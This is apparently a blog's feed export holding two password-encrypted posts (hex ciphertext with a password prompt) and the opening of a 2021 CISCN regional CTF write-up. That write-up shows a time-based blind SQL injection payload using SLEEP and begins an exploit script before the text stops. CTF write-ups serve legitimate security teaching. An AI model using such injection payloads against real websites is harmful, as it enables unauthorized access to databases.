10d9117857d47397d2e4f4a7497e036c2d19cef7100810b3307376c1e1d8785017464216d85d06a4d946c0e42aea10ab99e4f35fadc89ca8306dd26320650d5991169f884227d2c7ddb81e679b639e3a3c5d4e09ba11dbc618e4979f17a54853cd321329e04886604650015909f62529a8c029a6e8d68408c487fb86cf1a7a43247f49cd52bc512ea884afe6891920125bad7c5392b61537480f8278e71b5c8bdf77849cd4a68a80cf0318e6d13b0c3b02e926c446657796cc8b3ed38617bba2c5d9dd6dd1606c5bfab4a7472e0b5f52735860721f5003f715f88ea116cf876032e6f52e8b79db3691b6107dd7dc517b48bb17af206e65af80286b3df9b67356aa266c839363d1cdd5887272646854be24a037a24d7f232631096152cad5be5c1b975386e552aec909e7a4155ac9d36e75eaa4f17bc205ea3746f3e7692f6a541de211ace32648fda6a8bb242a12d98bf64634a46eba67d12e20cdcd5db2d6f71a90d5067d318b427956ca5b6b5f474688f46986b3d2e1422871a9bbc663c020334a7cf935d45ab3c7fae378276bc6e63ac2d182bb0b095545b8a0286fdb119e823386247b204dbf60ffe5ae86e5d77e81deccf2166aa20045e907a9e1903b54c5a2b871eef66787b4fc627669214191357b1a278924404d36901114323a0c6a65f016ffe64f8cd7ee7e040a16913e14b3bd7c1f53d5c404374b3ea5b13485d7e52aa5b93af2bc0c7f446b0d693843837c95d0c53297dc64222443a57dc5400f6d9c375ca78b58d90e4c2263c38e8d1efc204c2c4eb1215bdc112811f87140c05a709a32c599314c83c9336b85ca62511dc6113bafe781d2737178642cd3a75058a46704f086ba61dd7173db39cddf40bfddcf2a0b372b57d15126a5541414f60f13a27d31340b58afeba9a5f36575d25db3c8f5ae4c65eee40a74e705de3b656c2d36f775a50e956a86da6a090be8cbfd7cd2baadbc76e413dce87e86c13dca0b847d6356df527b97db9869de0ea3e7ed69ce6a649ce2024adc43e001eef4cc37607de75ec5637598f04b6498a93efee213a8bc0e47cb1411ee656bdf6617c1f6bced0f001f3cd8db8242a40803a263c2487e72b44fc57612b3052e1975286fe1648461cc61cddefdaf497bf93205dacf66686e83fe10d0ad70d68bfa96c0ff3f571664a2bed3def5139750c272aad1b3c825ee87a860620bddc1ae967a7c2563ffd6d7bbfbcc2efded07ad3621e842cba54d07182ca3443a851a5586af3ac33bb86479b941c86cd031fa641be063b3215cefc13a850c2103b7db3fb34b8e5b404a6851b0bb7e256a7c01ec33ffb1e2c2b3d9e58ebaa3f144a4212e564a16678988ef6c7be78b621248312424abd136902865abbfac92b673a74c8a5f7ff4ff78a3a7d438c96db390293d97d9e0354804c1755dd7ed05e89959f07f0a42fdda405879e414e5a0f91352415fac966449b8ac3dd0111c5457705028e63db4121b5cf61cf04b1f9449cd4b1df10f8689413354463daf4298ea8349e12159c778aa7605befa0cf68229231987aeacb5d24f9d30b94c88b5c21887ec6c54b836ce667e8d6a6d640e93abbaf23d0c7433b99b9d81deb51765340af478014594aff658d99af1b80c912ddb6df01ed0ada81aba980618fe14b4eff2686b4a925e6e10dac7b57a3141dedd6ee111df389e0c62f55c182a76a0274133e2236bea56620f839805b80ccad28181b9e1852f18a3719a12cbed3a6a9e058c500a09d167c3a851122eefe0cd6f209eb7c558b142a5dc50dcc59c1c1dd33b67a84066d94edc06d1011aaf4daafe115473277eebfef01bb61f083b4e16af33493a0e3efee9be75c1e853c4b890f7cc0be2200382471376d48f13a89029ba43a73051b319ff073023e9c5300d13cf7eb510eb924e90f0d75b19bab9deec1b1b32ffc005438471cef28a13bb7b5f85a596ccd5fc8b853259a0f1cbedf273ed070e0c2e8bf18a109a80d45934c0cc4486d9ddab49ba45d8e497c5480872c4443d799f8ea0789e22cbe4cea78e6a2659250b52cbcaffe3860b2a279fb475d966824b8bab2617721638f8dd12ba57bd58bf7434df862a7928cfc4b585169d91fd47350aac50a49f79277529ded86680c44ed4362e35864097d115dd2591a5b74b29d85c7b2e7b5c385d259f3fc936448c27f5b86917f1426190c85e3134e0b8af19f9ad3b6f300f3a1933aa0ecde32d2df35aae2a3b832fe7245ad761c5ab74d1b496de8be0c59e5abf0ac4a3ede5d760c6dcfe8bc67c617ea125676d3e0325553ec49d5ff894f2915378b7a21047ca33fe004be67bd8b8cd6fbb531f9a2efa6ea7a9804165094c25b942d82934d0ea5bcff3c485117ce815c0b4bd26e44499742035686dc119fa810b3272ea107044fdb0f7f3c19487d6a1306dfbb1bd6b5f322d15527c6adce68876e591b6c00ff9d6f00881779562fabf326b47141addccb6f6bd5406fdbcf2c85aa9b8ef71839ab4f342b666b6183a47b6a1adacfef0294f02b132fbf5607ce0fd708266d45aa8fa50d5332cc4e38a8b54fe4b345b3bda5d96861a59f4bfdde5e719e6d824c0afc4c39dffb2576b9fbffa36a5948be6860b3d6e2ee6e27f0b209e2fe0a69cbd35dc5ce8d6f07ac24fbdf444ec416da37e406adbea53be1f24d272011180cdfe32f77895ef18bbb89c738cb2d61fb825edb74a31593718b71a7251d52a6d30df06244deee2d5023be486cddded2f04b017d662cc3de198cb3120b3a91ac1029f413b4a224e88646786b556c70c43631c8b4a0f7779a23f95f6e92fa8d9e7d9001651eb54b53e03e769cc4594cb2d5095a29cac3a75577c918ea46fbf1bae0d96f1647aa1ab298be36b627022d3b8ed13aabfea9d4e58528bc8e5629900ee6f7851c9a57974e60266fcefc4e47b7f2a0bcecc7af7b6d07c165bc0d2d1b284ec183a2b427e8bd46ffe238e9dea4bdc5ae3f76b53e3ea6e4f9a3ea9293635c89a64a8278f2b389f70466d5c82f23d0eaeedaeacaec9b5f87a71f7fd1f10147fc7fc3afd976ed0edacca69ae651c13b830cd5f908ae3aa8e4461c499a188eb9f30d6f1455aaf2958f235e2577e8d5ecd15e2e480ee68866e7fe656747690a1ba85317d165b180ecb9e8d271f97c53e2f040adf28e72c2270f5c73e656dbdc459facf1d687b7d2c8a9fb76a1bb31f1ae0f2baa7a04599302d833927006896821db87016e203521c50f604a290bd62638a4bcf32f69f93539a9193dc118d8d2a251bf73f29b24d3939f19e6d7b8</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">需要密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2021年度总结</title>
    <link href="/2022/01/01/2021zongjie.html"/>
    <url>/2022/01/01/2021zongjie.html</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="604649ff358a4d737757afe65e29d989a6cf1873a1262cd47297a6d507a7b71f">217bdd39c51a2a9f22072c7bbde672c85c7641232fc069be9fcaf16732fa6b71757854f104cca335f8bdb40cb4535e6469d027be6fec7842b78d77866951f2b6c23abd040ca9d32ffdf49bf8cce09551ed8ea8cd0ee89a18163009d392170c91aabda967f0454c17205c35e2fcb759a0fd6fac2bb22d160203f45039ac33fc7eccc20e6516c1f92227d6414c631cb85cb64eaba3ba11cdee08a534cd256a2ac387b36b2a77260727afe7e5b1ae58544c3c1da3f7f090cb27b6510a7b128dd07d278c19a24c9db1ff5fac5e8ae05fcd16c9ad7541200e95501b891e515fac1e922456ea9f8d7ae35c4b8f1e8e008f98f8169ebfdff7345833f39b3809400de3ef747507e57ee0f21bb9e092800bec63242cc9a18e0db645788b0bbd69529975fd67c84881b6bea7688e7a805335c32c70d730b201e4935c36ea9c3b8b445d8b2a47b368a54110323cef7762e625fa705f145328da28f2a2b647fd6127ac6530178b9028b95d9ddd58cf56b0261f51fc5daf7656fb085e2b6d2a66a8a7e417c609a4506fe106043a37c3f2677724dbf3bf77ddd6ccbaa03c64d050c74f090bf2c6cd5b21037d057ba045a5385844da7a9f94c25db4008a58ffbe1e65865b5dfc3395be218cb2163bf595fedaeee1f80fab8945dd46ea27dc5caed5895246023868f541d85a072cd8cc6598fdf3aed66cacbaca0bc10234d3a7829ab3134d40f10a860602c35e5205d70b010772bcb6fe49447db3c1bd8f79eadd9bf7f7e18216739ae57d8d016850373f170af42e680fc7108b04bc40a81852bb6a1c761bd9e2ab288dc11601f3f24e5715c2fc6bf09dfc778098cf5d2f6e430a8181e95993a0d28aefa2742416d9d08e832a4114b96d6417005cee5626e823a885b4fb99410d79dcea6190ffa33a146da5e14dca523648bdb9c3cad9ecec043b97018b6e541f0914bdc13ccc2cad15bdbf7821bdfb9e38c3362efcd913148894fe7803c6c50e77b65951f509c7ee4ab3cde099d21f91a780e90da320f60a5a4c9d07026a131965dde0dfce5868c87177ea3f610d4795e94387fb9c2f043d717470501a45a788293e87e50385ef258bc4a144f408e7dbbf07deea503ecf12c8d3368eaa99a66597472dc96864f840e52d8d12e21bbef58e53d3586929ef47348f5148257135dc8a9153d63278fa17e01cc219a8c7e6189907c2bbf317148902251dd335dc6ff09cc8853d8f5bf44c26e92f05c405dad0d8e658a11e788e0f2ccf16f73f275accd0fabd79e74e277cc318002abb19aa163b949f748aa871154f48744f4a67272c528b740278b13603cc948c8846fc265081ae6be0295485c2cef751b6176d960f75cf59435a7f51025ea6f07e12694237a94e4c796afa047af399078709aa89da9cec0419a07a61ed007920ae018447178441ad3597782909642efb8b7c9bb56b8d75f1894c6879fc76909b6486acab6c494a439dfef80e25bf29ea981ec89d7a11fa1182d807736bc192d22f990c8e9fefc566d2aef45ce07d2881c63e20cbdc55f5b93d48fb776a1b41336db92d00c59e2c7aef3177319096b0f04aca9f8ffbbc5b3fdbf2ae71890c79a3f5d1da705b6f3ea6cd887d31323ac9b3cc16b5a7044d3f877a122584506b49ea7c708619591e90cc7e6524e0f7ce1f6420e08b78dc2ff48da1bb497189626dea0cb17bcdf31834218eaf657ddbde8b43a3c35bf0bd6ed397cfce3d4465bdd44509d181be7fc245b29f3ee08153b95ff51257869c744db63e9c83882126420855b19bff75e1bd7fe70050926ca82eed32716012463856e38c0f82090dd71155dbc408e8253babc67810b67a5f39c998275ef28d54be5ee0b78b573c6a6909072eec4a6c3e0a83615167d30cd418bd9dc369f5e9e265bf9cf0e9784daf27a14b8ab0b537b1d9b20010047bff89752d6b6ce6962cfbcced775d4cf81a6d2497f955b1ae8a34a89dc3c3a9e3df6fc076039b7aa86cf19712cfcfb23a237298997a94904999d267acbd4ca85a36eb1f4dded671f711dc2af701d500128b4090330efd141bc3864eb7e62509251dec007e972c537bb29b44e9433c4a5a39167dd6f67a67355450294973c3e539e0e99751d84e6eb8a3a1fb3c6ecf1fbd203f8ab12d65b8a4723e7ba54703232d527d20168ebdb7f10e384b6d586c63707755fcded761e323f9dbf824cb462ee082a782a2ce48e7a9f9dc3978781ed90dfd3359b92ff18de04740085b2a6b31d6f05ba091127d56a8cfebbea69d2a5a1fadcee03928b802e0572c0b14669daf2d5037d8cdc3d13389c2c5b30b7a469a1765b34c3a9ef243ae16d520ddeb988544dfac8d1f797a0638bfb7754ac93d47c31ab18d851f383e9d1a450f80642f0466ae43b622944336e886e3962ab092b61672e0b397d98265dccca9d8d1c540ff5e9fd9eb8588fc3620803e03b408014bc45162d59afcd77446e230d00283b352e28d656674b8470ad73ed0058985c9b39e28c3e7f50651591d59864c9ef3f571974b3283f7394835de1a44e734aefc58b5cfd0f3e42b1710468bd636a23bd352452df9edbe2ba8696500ce69ddf2a022d650b54c29e86e8ce7b47fba06c810b0fed39636e3e86531d8f1b2823287c94a3f27b5b9e332a24351399a45850b53af637609492485048d8394ef945d258796749c93b58dace46dfcfa9641a310cadf3099c9fd86df404fb45b53da5199a847b565f02ba62facb0f5fa76c4e65c0476ae3bea63e553517ab32b85a1fe8fbc947f89cae48a0c54b345d2783049f8d583107dbf9063e752c789926e1d10ae56170f800a7b5919bb9ac286ab17a0a5021591abb58529e65d6c741c13cdce9432e35e1c6e0d6e8522d3152711ccf37ce850702d60b9c00eb169fb990d869e79ff5b13983c6888e4865118ac608bb2ad3e87010f3b3cebe9f07154293ece3c24b65ffe91391dbdbc35e4edfdfd1839038ab9d41d43805a4deaa733d4251aad0b89ed0bf02caa2a6a00a610c25f6046206f94e5d33f9cab79926aa99e54f917fbeb49065b9f2c30bfa7ae704af402ad165a431da7c640463287427fec5381a516a3a994563b6cd1b1de135be82c09605d24749a13d103336f48e7dffb0c7331e5b17420f17999bf4cecb794214da9a9c3ab368335b04fadafe7310ec69237f49d100558ef625b11fa3397501e6022917a2e13f8f54b14ffdbaa1913518ae16a39660ca6b53fd1aeacfe25b60107a66513063e1b6b1bb4c42c8f62439df253ea4c90ad880b05a89a58939aabf7bb0cced5b9e63214cdd4edeaa080699abac89cd6229776ecd77d9a5b1e4a72a22320ff5950e2037e3f46cf2ec890ad44d789ff747c8b5f8845cbb2a31fd9f77f3d9c96793666d8c567469e79063ebeea4a45185cdd7999a21a1222b0ebc94b02fd342872d6daeadd181de1a87e6bb666407f4741b7ac1384d5c982d0599cc5c3d76274965c072ca148c45640f72fe9cbfb5fb92c65a9adbbb58e31713f570a53604c7e0dd2eed7a32da7bc48d8e8e60017d526eb7b5b17d8bd26f8e0b3c06d5600d3ef85127286dae27b7653c238703884c5a0730cc165e3b3558ac045309b22923bf1c9b005990a835a61d6a4197965716fcaffdd1db0f6a70d0fdcd63ac9a7e03f22dd39678886e082f496f7e6e1e178379a21714ac22fd9a7edfc57e48c9c232c6b361bd4b6102688dac8608a8ce3f8f26290d5feb806d0d09b4316962feb16b363b1d98f7ea77059a2f7d763a34fdf67e0288e240652de97d409de863b252490d0496ba8721df1dc33ce3f17f8437e92fd01dbb9bb2b66ffc171f3e7b0b36b453fba66c010dda38a88ffb429f8b466f1f26be13544abb034db9838c2695a5ac73ae54f8b8ab160536c90d6dd592f186611b83afe4db5cec7865c61fe6c24d41643bc760a29176066caadf6cd2156fa5c32cddf93325f6545bcda63e020d0a6ba3c2e6827a9b1e396f02432f295ea2a5ef9cd7a8d16a87582323bb36b179210df171cb4f9895e72b79e5d2e249912571086fece1f7da1fc154eb54748ab493d2d3b7db44a8f194e305e25299ef47822fd829af985a47bfa6af2ea2eeef5089715781fdeb81b10d7e4312c2e3f227d5e91d775d152007a1d75a6010d75f09114c1277de2446f9e5403d1c21357c81a45552896c0bc0a996bce9fb884f17c02c098cda013b81b29b2c92296e59cb2df58980044ef0029dc1b4ddc60f80d857a6a3443f28940de07e9b2bb25f756d69d6203420186bc4d4a7de6518962bb028112ac371d77196524ee9a81f47d68c5e78f32acba3946d167eae4efcabfd10378216e41c89c88fb0fded0156a681edebf1ceafd53b07d96f67ed35d9410471325755046def034c06e4daed9f6e5af9c969c60d31ed355b6a204a854abd57117865bbfb269009b5a08b4fa7ae9114c9083dd7660788c3f50fe1dbbe44ec45bb7ef05fcaf935aaa92487938825a86c6f9e41ee688e0aafe75d8648d935e9c9956ede23f52c11572baca0033a2bafb28f56fbcee24b4efd1943b1fe17e1e4d9d834e2a883259b2c10e1300a7842ecdf043875045f4abadec92f50d22fa007798eeb6d205e26ca8831c3874ffbd2951769ba405787c368ccb26e13fd0630e804568ad12f3b81ca7e071e6f60d94a0ce131f7d57d069abe68ea3a1fa2fd7cbc4e893e563c45cb380a79cc245652f3059fb0f2bd0277a78704cdf37316ec0fa7ccefdb3b59566c0a2a0e6adeb9922c565037826be2ebf29e4df53df55fd64c86535f4e5ca71ee6ce9b0fb3cc952c5860e57bce88d3af5153ad1560ac0d5a959700a5b5b02cd2a58913ce85cacdc85dc9d81e65dedbf22de01770608a740c2a0875e8b24ace6eab28460a8ec967641a713a74464b4991ad994d3bf26c3abf563c7e97806e845bd94b1c1e90b6110e8682e437f8a753980f8f98f91e1bd23abffa99ac2d1cc15c4b1d75ff46a3fe56dd9b1084d4ea5e0e31b4e1fd4599d2adc4b7da7e94f9acc28ee1eea3eb99aced39718f1de07b4122545f58a51e87dd82b5ed1528ebb2729791bbca0834a8743336f4fb3fd7d46149d71b182604ccae5385c6e31ca4ac08031b2d846cf9ed0e5a7054dd8876598a2a1fbb4c318efbc45ca1c14093419fa2e9e6cf367b3256c30d887aacbe074c5d0f624618e174cf75f20747657a03953810bd22605c4a62ee6c592ee8715d3eae4f9a49f007cd1f1ffe6fc093cff0b64e7af2f8c9ec05b32124e4d2e05a05556a178985048f93cf3383f1aeab603c3ea68aa7dfa05790dce52e7dbbd8f37431271d4a3e4615619fdb21ca04160ceffba1a9bb3a7dc81e51ab2dfc58b9b2784c48eda1aabf23c86681fdc2d341dc7ff9e2f32cfb2406997a63a2c5def254418831c143a11c4ce454203fa258a9d12b39a845081879545989f2bed21e1f8d52f33afaa47f15ba15e1146368398ca76b4fe615869fd76ae772ef5bd72859866ffe409ec65065bf0f3a2d4d90fd922f1f4c8304dc22c92871de8e5655fe7e14a1cb9f1ec347024d7d64bdb66e231926bd2b182b15a8a5e9f0e715a15324aa93f9d97094822df2d54b522fb3144409c521faffdabfc652b4196f5f565904e76b0b8a4a909a0a6f34a03c52939a77de942008b0071a36eb1fc3432a0cb887664d1aa02227e5dd81846f23570c8a51643743e97c086db8ee97a6edeaad065355f7d340efe2061521852200b7c2a1845a4926f078ca314c3149630d27e2c2c18a0032d12cd22598f1c04b528722d47ac3d455f723944563cc0315734ad626107efe1a3763e66cf5ad36c866552dd525b4fe798cba2cd83fcf9665be31211941d750ccd2a771f4ffc905661e8330083b37ebeb5402cfd43df4220b62306c6f26d07aae9e8b73343a59b01704075c51315b2579debc70a8f292cc7b469b36f8b5cbdb486749cc0ee2f191731608628c83d8140b97b1202449c772307c5584fcba6200beaba8a4f4026e49c15deaed52175bdb47304a1a11f5359a4dc45ef60f34cb96f5539722878b5c8c8ab2692d6736e9a303183d6e6f8c5be9d1771c2a442d8f0cfbe2310962d2e60def4ac28dd3996ba838132038c0d749f9822f4b342c7d4d836cf6be311c2e892d917327ec4e96e5a674f772bbdf5070d779e67bd820c50f79c5e01820a2d962e2f81cd55c42864f617ffa27b62e024c7a79ae88b95e03c6315bfd0478bc7d2946851cbac0b643f9775d6067aeaa8910e9eaee766285f918209c590767ae52a0f422d379134b1b849a82332e1c5f4769596472c600d3b159a87d6ce530488e8d7584eee5711884bae7be11deb0e8c4e48ae1b17ca588638006e46e04c5b8313c7fce2b26b5563a77de1291d6cf95d1568483987a0709161ce3f15d5ea66830f4046e587f399f65b7114be8122c5c2b791738523314272739f21e24d17d9af409c3676d0bb8d0066de911eb8027cd0518c375cd8d1ddadc6ed43fe0c6365583f1652c9b0a95db8dea517e3d9c6cf176e94668b116f20444778c3239bd29f4fc710d85d0d3e54a723c578db929db368bfda56604a985c9dbf5473d3a59998e25fa5bf89a95adcb1579f6d9ad586c73a4e07e88edb871805ae36ffc9aab54d39734f56492b99fcc3fd3bf8b9e0f95348fe153adf98245c289af11b50852f300859825854abcb0f9402ed6314e339aff667943fc91abb7bce4486458f8bfe3701e96e867ab42236004f79854e912a7993c701d991da53fceb88b403231788fe31d5b1bec76c4eb13c11101ea05017044912c11e53bc9b4452a3fa6054b5bc5b4e35bbd43c4b6cf5e3573a2eaf40fbed7c2cc88d873c31808cfaae58e12ab83111699c80be672d568bb613f845a0377f66a04f29bc317e606678af18bb0658d5239b6b5fdf3a5a69c1a2a78f001da1d2bd363f7fc54eaf90af0fb358f0cf85ce9ba3679b71c85f3b001cd4f97fd661300a8022dec9690f03bc8050e107d37995c983e9a2a36f74a9c6936976a6d3bf0015126d9a77cfba4f9858b875db23c44c9ff7c7348e66eacfb018b71d66c8fdc2d47d828380c6b4ccf31e61e370d383128584eb5c7bf9d20652ccd3d8dced672702312efc3980a55f0ae933a59b0758844b25ec4ae3fe39d1fbcb97eb93ba181879005c296f93009491748749790b96904a2356d430f78282f87f8869b3ebfc63ad1f991842d08a42ff947c28fb13c2745ee6068389205f160c77a7063bc5a60f47523695c65a0f24610f4133477fe25529db4bb83a3eafcc7e4eaab26611049ae4ee070281a4c1c04f568efbc0b81bf4d86b5c60f70aacb42f2ed272feaddac51e13b8fee9da46d1de9930766d9512352962a22f489a573f62baa58a1c53fc243c1354db635276780dbadd161e436497da2af827d9daeee81bf617b9eba449841285dcb81fd36b332851eabe6c076fe8631c49a553d575e2dee2435fc45bed39799eb81ad3058c49091d9b23ff1db6fc76c30071fd1fb2fa38126dc0fdc4827332e4e806d4905e58524baa02392228c3e9f2ff88b270c661e07c24f1f4480321bf6e0f29f7b2a94c61155b56bdb317e74978b04b624a87e0a0b04df1cc4505de8d37dd38d09264f979ec6d048e90ca2914a1f055c8e990d4cd5db5b49933f94bd315ec269318e6bfead25cc7482b00204cb3a1ddd0da734f6e8898b46b6abba430d658b68380ae556258a2ebe6ffc05fa5ee1840d90d4c99cb7494f424d9f03266321033d0cff48d410e4a0444b918f177c3297cf98eeeb84975146f6785edac1181847cf2415562eee16a7ebb4ae13db17add7debf1860f3961b41db49bc6e0bc21210912e0340513b6e40b7a3b1569478fb581ff46458d94e78ec4e05a42f45bf19e6d0a1eb0ff20e8890b8b98b10c76900abf77da9da9b39b8dd6e6ef61b9de1aebd4d710c9c86d9790e4fb6c3c2b7bc49394acb24461907e72ca2c79492a22838255cec77e48c39b4a48ae32063b012c98b47775b307c26d1c4729c1fa00228c1273bb8d8293d722a3d3e10c76472901ffc8e71e1756aeaa1d21ff92b72fd4a697eac1eb8e53607407d0f7a790cb54a627348c71c4d4d426db2be1895b070f23b25779425c92510cf14d94e154ee90506ecade6dde0e3ccc4691ff7ef66a881b7f21a877fe95a457098d44856602ec2c5df279377dd0b12418e143d08465d11244e8d9aa09a9a0e8007c111f6bce6d9b8ae5c3a424d521b4cfe522ff2d8f6e4bd0cedfb2cb83aaf67de87b7836bcf081cb075aae1795599d70ce6157ebb3f4d42a3444af4d9f249963b4a528196f8e68bc47fa154c29956676f1b81285e826620a876f9b6590766d7cef1f870adccc0d8218114f1022b23049b9af703973dad82d385f1e48d32fceedcde210af1beae5cf9cb3032020c138bc4087e6213876ef775237ba9e62b6b7693e59ce05cf3052a47d27733e16207f3e8f0b875b924ac7f759d0543ab55676448035e6f62b9e45e9f72d6c0f27781631c944a7fe0dbdc656b86b80d758159fc9eb0b945b9fc7ab57bf3714f80b81ee986484d5c8cbd79a10741300bdda060147d9125f6bb0d664a81130fcbecf89d2ac8aff29a78d7821abb4050ef853cc6e5d6726b0bd2cbd1fa4d04854e81fa4588b8c6920626cf5ba1744f6f9db728ffe414b77c653fdb5ce8d8b33e470b2f9ee6ff9e692384a37bc71a24a59709d834048dfc163dd567d5044a0bb04a060bd4494b229421dc91d87bbe6bd2bf08c25ce6f385e388d12ab443ddefc10579eb06a02da29835e338cf3619f180e0125981fe11a349646bca9d2cac93b87a5e2bea3b59a91bf4188894ba5f9caaa2ae04e5fe5c9280d372fd4a898aa9dd89a3af455e159c31503e14e85cca543142ea47371f6ed0858932adb70456b1c8c4a118b0c17ff660aa4b09133323eefe35b7c80d8a85e6f193b395d6ec10f46d00eceea0107e11b48d4686c7a0292b3f5715922c39d8adb712ce1982f89214534d88495e1db9bdbcf4d6a983ebaf102d7696e18710d346618ded6c232fab1a21a494fc97b654992d68a1c21cd124a5f56dcacb93c22dd6aba6ea60637e52487c41d2b8d550bd2cc8993677d8410d78a1ca52583f26dd665c25b5dfafaa90febe88472a8719b2718f268b8fe1c5ee0276cdc76e8f9767000370db8f9e369e46988bea995734c9069f27fc715c13dfbf117f31ffbe926d361a67abb9e24b0eea2e2cfc8e2bb799ead631150386bc5c341a7241e9de8b1aebd148dabdf68111276f427bcb1e308a61553bbb4c79e2a81c782c249d925f2734fdd75d1b6af0a501777ad08f4354039f64da5eb86aaacb20e62d473c0904bc9448847c8132a92a82c64e7880edcad155827bde784dac7746393e5bbfa802120588a0ad87e17b5d6726ccaa9a751e4a9472a6e977bb56c2d4cb020fc372e1534dbd7df0c29793d5fb4a88b3d18e0829a95c254b5892404a709e65eb09db604a2702d9c935bc05f7cdbf7c99a2458a01ea351c8960f895b6451184d72b99c42f97f490913ea36005841b1c26155e87f6b5a0238ed3bdbc6ac446ba352f047477a2255c446ee7d7ffa10b3fd4fc8cdebc52b92d93679d28f2c281adac58a541382dda792ab8df81dc9e5a88bd332a651e5ec459ec754a13e32889f6ceab9e99c0924beaa3c5bf326a2fb2fbc45e3b87ba40c686eaab055ad472efe0c4e66aa647c5c0dc53d38b9ba411c8e2419976db5a6866e09471fabc3834157a9800776db4536eef1e86ac6752b8150ce8a874a8ea5db751bded7b6fe18740a9a66c34c792e5fa433a096e4687d366a92655897bc17a86479d385a6a83e8b934fde541906206005e8c50aaefbdee34a0757b5d42a12d97a7fe0a758faddee09bf834009c7376e022de69a1481f5a7bef6e9e22524c7b9c1b2fe9473f16602f6d20f88734ea3b3a9620c3f485133e4861b3c3881cad2e879b4045085cfe8c39201b5c9381b41db14fa43053755da758a25ef7683b1a6d093e67a183b30035b3c85e5789e6794cfbbaf4cbdac3f4e62d6878bf18cf69402c1363a57ed9a03bc2657f3bfbe6071e546dfd363b503dfb245920c3eb6c7e062daa087528d27f82828d5f62f0e981ab03feef05b4a363109431a840657058296e838620315b5a2cf00f6ae47a7237dabb0d640417b1ea8760de6ebde2c004109e8c961d5e32319bcfb9507f7a63d84c7e35a918c128334bb51d7ff4f7e690458c0ca823af8175f58f360c0d41efbbdcac379a89113cfef78031b06453c7e77914fa54c447e1ea3f72492fc919edf56e6761e780e8172c856132c7130145b798032f577047cb019b526995677daa7c5f2688ab5c44f2cc5c5673eb0bba3a644ba37e4fe2abf77fe5e34440cd14a10c0f76ba9741d6db74146826c8f9962acbe069dba3b1cba909e66e56d9858aebfd5f7b8e4c1d1e3c59a84d9f1cc758ffbf8cd44f7e26b2a5f636736602ec70715ba5d3fe9114446aa3620c069b0443b29f843524804a7058311b002f9b5245f8ba3965013704de40dbb7d6f47dc954193a425096498292d8266b69f0dabfbd1b71833ebe067a9481a5faf847704135620b6a2405eab9a152aef03c64cd75858c818428a633c25106b98c434d5769805bf06e54698fc5aec7b08058762ecc4871b5df1b32d2ad74fa240b5ea7b3b565138eccd331e4bcb7dcb1222c665045158d90df8f0164f8037048826b33a0c63c7d7d0501754ceb1444e8850ba5e4964832234db78107193fe1dd2c5b9d8283a06967e8ef193cbe8273b0872645d52e2af304b793d871062e1e8d05269b6c1c04dddee74a0c8682192ec8977e5b22aa05251960d96331239a4f3137495c35cc9966a9a4d6582c9e4aafa3e1e790275dea30c74eb72bc00315379e521a12fd05968a90e270abbfed68b2b492673df872a91d4ab7494fe3ec5792688196585f25b8935f8b7e46c722e1bbc24a985af2b8d9081ab3f7fff0ccbdfc58acb4de4a365f306c7be7b93e9afb16f998b2a6e3d4b2cbf81a59695a1639c4669942fd815a5f0862037ba0641450fa6b2b9a6eeec9fcccc3ec2af53f5bb1d2f17dad934f4bea7b40bcb91a6033e2a7d0625d883d541aa99bcf24fb455961b8692031b0dfd5e4f7d64465793d461cd4f2192bd1d4434e83cc9bc99b3b258882cc097879e6c4a27881c84ca028fb9bcf594872fb6f8b905e000bf80991c4f77825617ced5614392037dfa33409bb9c0efbedb86f1adc9c5f3118a1c3fb5c241abf38623796af8a80b7f775210c4ef427751f1d1e9bebed0901db285382c9c8c0cf321edd360a32708226ee09e1074942d3f38cce740f211cf911096d6bf850441df4a3c0a702fcfba09923d75bd9d1dc70c5d5a7693894c213770f5aa91</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">需要密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2021年东北赛区ciscn分区赛wp</title>
    <link href="/2021/06/17/ciscn-northeast.html"/>
    <url>/2021/06/17/ciscn-northeast.html</url>
    
    <content type="html"><![CDATA[<h3 id="简单的注入"><a href="#简单的注入" class="headerlink" title="简单的注入"></a>简单的注入</h3><p>简单的测试之后：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs plain">a&#x27;/**/or/**/IF(0,SLEEP(5),1)%23<br></code></pre></td></tr></table></figure><p>可以进行时间盲注<br>那么直接跑脚本:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs plain">import requests<br>import base64<br>import sys<br>import string<br>import hashlib<br>import io<br>import time<br>​<br>sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=&#x27;utf8&#x27;)        